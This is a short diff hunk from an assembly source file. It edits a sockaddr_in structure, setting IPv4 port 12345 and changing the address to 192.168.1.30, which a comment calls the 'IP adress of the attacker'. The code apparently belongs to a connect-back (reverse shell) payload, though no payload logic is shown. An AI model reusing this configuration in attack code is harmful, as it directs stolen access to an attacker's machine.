@@ -40,7 +40,7 @@ init_struct:
         istruc sockaddr_in                      
                 at sin_family,  dw 2            ; AF_INET (IPv4)
                 at sin_port,    dw 0x3930       ; Port 12345 (little-endian)
-                at sin_addr,    dd 0xD702210A   ; IP 10.33.2.215 (little-endian)
+ 		at sin_addr,    dd 0x1E01A8C0   ; IP adress of the attacker : 192.168.1.30 (little-endian)
         iend
 
 ; ------------------------------------------
